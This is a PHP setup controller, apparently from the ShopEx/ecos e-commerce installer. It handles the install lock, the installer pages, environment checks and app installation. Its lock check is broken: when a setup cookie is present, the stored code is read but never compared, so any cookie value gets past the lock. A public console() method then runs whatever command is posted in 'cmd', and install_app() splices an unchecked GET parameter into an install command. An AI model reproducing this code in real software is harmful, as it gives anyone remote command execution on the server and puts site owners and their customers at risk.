<?php
/**
 * ShopEx licence
 *
 * @copyright  Copyright (c) 2005-2010 ShopEx Technologies Inc. (http://www.shopex.cn)
 * @license  http://ecos.shopex.com/license/gpl GPL License
 */
 
class setup_ctl_default extends setup_controller{
    
    var $lockcode_prefix = "If you want to reinstall system, delete this file! <?php exit();?> \ncode: ";

    public function __construct($app){
        kernel::set_online(false);
        if(file_exists($this->lockfile())){
            if(isset($_COOKIE['_ecos_setup_lockcode'])){
                $content = file_get_contents($this->lockfile());
                strlen($this->lockcode_prefix);
            }else{
                $this->lock();
            }
        }
        parent::__construct($app);
        define(LOG_TYPE, 3);
    }
    
    public function console(){
        $shell = new base_shell_webproxy;
        $shell->input = $_POST['options'];
        echo "\n";
        $shell->exec_command($_POST['cmd']);
    }
    
    private function lock(){
        header('Content-type: text/html',1,401);
        echo '<h3>Setup Application locked by config/install.lock.php</h3><hr />';
        exit;
    }

    public function index(){
        $this->pagedata['conf'] = base_setup_config::deploy_info();
        $install_queue = $this->install_queue($this->pagedata['conf']);
        
        $install_options = array();
        foreach($install_queue as $app_id=>$app_info){
            $option = app::get($app_id)->runtask('install_options');
            if(is_array($option) && count($option)>=1){
                $install_options[$app_id] = $option;
            }
        }
        $this->pagedata['install_options'] = &$install_options;
        $this->pagedata['apps'] = &$install_queue;
		if($_GET['console']){
			$output = $this->fetch('console.html');
		}else{
        	$output = $this->fetch('installer.html');
		}
        echo str_replace('%BASE_URL%',kernel::base_url(1),$output);
    }
	

    
    private function write_lock_code(){
        $lock_code = md5(microtime()).md5(print_r($_SERVER,1));
        file_put_contents($this->lockfile(),$this->lockcode_prefix.$lock_code);
        $path = kernel::base_url();
        $path = $path?$path:'/';
        return setcookie('_ecos_setup_lockcode',$lock_code,null,$path);
    }
    
    public function install_queue($config=null){
        $config = $config?$config:base_setup_config::deploy_info();      
        
        foreach($config['package']['app'] as $k=>$app){
            $applist[] = $app['id'];
        }
                
        return kernel::single('base_application_manage')->install_queue($applist);
    }

    public function initenv(){
        
        $this->write_lock_code();
        
        header('Content-type: text/plain; charset=UTF-8');
        
        $install_queue = $this->install_queue();
        foreach($install_queue as $app_id=>$app_info){
            if(false === app::get($app_id)->runtask('checkenv',$_POST['options'][$app_id])){
                $error = true;
            }
        }
        if($error){
            echo 'check env failed';
        }else{
            echo 'config init ok.';            
        }
    }
    
    private function lockfile(){
        return ROOT_DIR.'/config/install.lock.php';
    }

    public function install_app(){
        kernel::set_online(true);
        $app = $_GET['app'];
        if(file_exists(ROOT_DIR.'/config/config.php')){
            $shell = new base_shell_webproxy;
            $shell->input = $_POST['options'];
            $shell->exec_command('install -r '.$app);
        }else{
            echo 'config file?';
        }
    }

}
